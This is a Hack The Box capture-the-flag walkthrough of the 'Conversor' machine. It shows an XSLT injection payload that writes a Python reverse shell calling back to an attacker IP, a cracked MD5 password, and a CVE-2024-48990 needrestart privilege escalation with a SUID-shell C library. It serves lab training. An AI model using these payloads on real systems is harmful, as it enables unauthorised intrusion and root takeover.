Tags: #Easy #Linux #Apache #Source-Code-Analysis/Web-page #XSLT-Injection #Weak-Hashing-Algorithms #Weak-Passwords #Outdated-software #Search-Path-Hijack
# **Nmap Results**

```text
Nmap scan report for 10.129.8.92
Host is up (0.015s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
```

Full TCP port scan revealed the same open ports
<br>
<br>

# **Service Enumeration**
First look at the site:

![[Pasted image 20260202215748.png]]
- `gobuster vhost` and `ffuf` failed to find other subdomains

No potential creds yet, register dummy account to see what a regular user is allowed to do.

Home page:

![[Pasted image 20260202220015.png]]

About page has a button to download source code of this site as a .tar.gz archive. 

Burpsuite tells us that the convert button sends a POST request to a page called `/convert`:

![[Pasted image 20260202222031.png]]

### Source code analysis

SQL Injection not possible due to parameterized queries such as the one in the `cur.execute()` method:

```python
@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username,password)) # <-- Right here
        user = cur.fetchone()
        conn.close()
        if user:
            session['user_id'] = user['id']
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials"
    return render_template('login.html')

```

XXE not possible in XML file, entities and DTDs are not loaded at all:

```python
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
```

Python's `lxml` module doesn't support XSLT version 2.0 --> the `unparsed-text()` method is not available --> no including external files.

However, there's **no XSLT filtering** in the `/convert` page. The following line was parsed by the server (result was `1.0`):

```
<xsl:value-of select="system-property('xsl:version')" />
```
<br>
<br>
# **Exploitation**
## **Initial Access**
There's a file called **app.wsgi** that reveals the webroot directory to be **/var/www/conversor.htb**

Source code contains a **scripts** directory, maybe we can drop a python reverse shell in there.
`lxml` has the EXSL extension enabled by default, which includes the element `exsl:document` for writing to files.

XSLT payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:output method="html" indent="yes" />

  <xsl:template match="/">
    <h1>idk man</h1>
    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
      import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.54",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

After waiting a few seconds, you get a shell as www-data:

![[Pasted image 20260211175231.png]]

Within the webroot dir, there's a sqlite3 database that stored user credentials:


![[Pasted image 20260211175733.png]]

![[Pasted image 20260211180009.png]]

The passwords are stored as an md5 hash. fismathack is a user on the box, determined by /etc/passwd, so we want his password. 

hashes.com reveals it to be `Keepmesafeandwarm`. SSH login successful.
<br>
<br>
# **Privilege Escalation**  

Output of `sudo -l`:

```
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

The `needrestart` binary is running version 3.7. This [GitHub]([https://github.com/ten-ops/CVE-2024-48990_needrestart.git](https://github.com/makuga01/CVE-2024-48990-PoC)) repo is a POC for CVE-2024-48990, which is a vulnerability in needrestart caused by improperly setting the PYTHONPATH environment variable. 

An attacker can modify it at runtime to point to a directory they control with a malicious python module to execute code as root. The best module to create a fake of is `importlib` because it's loaded very early in the startup process (python needs a proper import mechanism), so your code will be more likely to execute.

`gcc` not on target machine, so you have to compile lib.c locally then serve the file to the target. 

Contents of lib.c:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));

void a() {
 setuid(0);
 setgid(0);
 const char *shell = "cp /bin/sh /tmp/poc; chmod u+s /tmp/poc &";
 system(shell);
}
```

A python script needs to be running so that `needrestart` can call the interpreter as root and do its check as normal. The POC provides one that checks for the SUID bit shell copy in an infinite loop, then calls it with the `-p` flag to preserve root privileges, but any other would work. 

To trigger the scan from `needrestart`, execute `sudo needrestart -r a` in another terminal session:

![[Pasted image 20260211234501.png]]
<br>
<br>
# Skills Learned
- XSLT is like CSS but for XML and actually has scripting capabilities (xsl:for-each, xsl:value-of, etc.). Depending on the processor, it has multiple extensions for more functionality. However, this can be dangerous and lead to XSLT Injection if input is not sanitized. 
- Python's initialization process can be hijacked under the right conditions. Executing it as root and interacting with user processes/data is unsafe.
<br>
<br>
# Proof of Pwn
https://labs.hackthebox.com/achievement/machine/391579/787